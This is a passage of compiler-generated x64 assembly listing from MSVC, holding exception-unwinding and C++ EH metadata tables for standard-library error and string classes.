$unwind$??0_System_error@std@@QEAA@AEBV01@@Z DD 031001H
	DD	0700c4210H
	DD	0600bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1_System_error@std@@UEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	022H
	DB	0d7H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0???0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z DB 06H
	DB	00H
	DB	00H
	DB	015H, 02H
	DB	02H
	DB	'&'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$1@?0???0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z DB 028H
	DD	imagerel $stateUnwindMap$??0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z
	DD	imagerel $ip2state$??0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z DD 042a19H
	DD	0150118H
	DD	060107011H
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$??0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z
	DD	092H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	01dH
	DB	0bcH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0??_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z DB 0aH
	DB	00H
	DB	00H
	DB	'T'
	DB	02H
	DB	08cH
	DB	04H
	DB	'&'
	DB	02H
	DB	'N'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z DB 04H
	DB	0eH
	DD	imagerel ?dtor$0@?0??_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$1@?0??_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z DB 028H
	DD	imagerel $stateUnwindMap$?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z
	DD	imagerel $ip2state$?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z DD 012219H
	DD	0c213H
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z
	DD	05aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??8std@@YA_NAEBVerror_condition@0@0@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?message@error_code@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ DD 010e01H
	DD	0820eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??8error_category@std@@QEBA_NAEBV01@@Z DD 010e01H
	DD	0220eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?equivalent@error_category@std@@UEBA_NAEBVerror_code@2@H@Z DD 011301H
	DD	06213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?equivalent@error_category@std@@UEBA_NHAEBVerror_condition@2@@Z DD 011201H
	DD	06212H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?default_error_condition@error_category@std@@UEBA?AVerror_condition@2@H@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?iostream_category@std@@YAAEBVerror_category@1@XZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?make_error_code@std@@YA?AVerror_code@1@W4io_errc@1@@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gruntime_error@std@@UEAAPEAXI@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0runtime_error@std@@QEAA@AEBV01@@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1runtime_error@std@@UEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0runtime_error@std@@QEAA@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DB 02H
	DB	00H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DB 060H
	DD	imagerel $ip2state$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD 010919H
	DD	08209H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy_init@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z DD 011301H
	DD	06213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?find@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KAEBV12@_K@Z DD 011301H
	DD	08213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ DD 010901H
	DD	0a209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z DB 02H
	DB	00H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z DB 060H
	DD	imagerel $ip2state$?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z DD 010e19H
	DD	0820eH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Memcpy_val_from@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEBV12@@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@$$QEAV01@@Z DD 010e01H
	DD	0820eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z DB 06H
	DB	00H
	DB	00H
	DB	'B'
	DB	02H
	DB	'J'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z DB 028H
	DD	imagerel $stateUnwindMap$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z
	DD	imagerel $ip2state$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z DD 010e11H
	DD	0620eH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z DB 06H
	DB	00H
	DB	00H
	DB	'p'
	DB	02H
	DB	'H'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z DB 028H
	DD	imagerel $stateUnwindMap$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z
	DD	imagerel $ip2state$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z DD 010e11H
	DD	0620eH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Large_string_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ DD 010901H
	DD	02209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z DD 011301H
	DD	04213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBAAEBV?$allocator@D@2@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV?$allocator@D@2@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Swap_proxy_and_iterators@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ DB 02H
	DB	00H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ DB 060H
	DD	imagerel $ip2state$?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ DD 010919H
	DD	08209H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy_init@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Eos@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAX_K@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBA_K_K@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CA_K_K00@Z DD 011301H
	DD	06213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z DD 011301H
	DD	08213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_NXZ DD 010901H
	DD	02209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?resize@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAX_KD@Z DD 011301H
	DD	06213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ DD 010901H
	DD	0a209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAPEBDXZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z DD 020e01H
	DD	0700a720eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAAEBD_K@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?clear@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXXZ DB 02H
	DB	00H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?clear@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXXZ DB 060H
	DD	imagerel $ip2state$?clear@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?clear@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXXZ DD 010919H
	DD	04209H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?clear@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?insert@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@_K0D@Z DD 021901H
	DD	070159219H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@_KD@Z DD 021401H
	DD	070109214H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@QEBD@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@QEBD_K@Z DD 021401H
	DD	070109214H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@AEBV12@@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@D@Z DD 010d01H
	DD	0420dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z DB 02H
	DB	00H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z DB 060H
	DD	imagerel $ip2state$?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z DD 010e19H
	DD	0820eH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Memcpy_val_from@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEBV12@@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?assign@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@$$QEAV12@@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??4?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@$$QEAV01@@Z DD 010e01H
	DD	0820eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@$$QEAV01@@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z DB 06H
	DB	00H
	DB	00H
	DB	'L'
	DB	02H
	DB	'*'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z DB 028H
	DD	imagerel $stateUnwindMap$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z
	DD	imagerel $ip2state$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z DD 011311H
	DD	06213H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z DB 06H
	DB	00H
	DB	00H
	DB	'B'
	DB	02H
	DB	'J'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z DB 028H
	DD	imagerel $stateUnwindMap$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z
	DD	imagerel $ip2state$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z DD 010e11H
	DD	0620eH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z DB 06H
	DB	00H
	DB	00H
	DB	'L'
	DB	02H
	DB	'*'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z@4HA
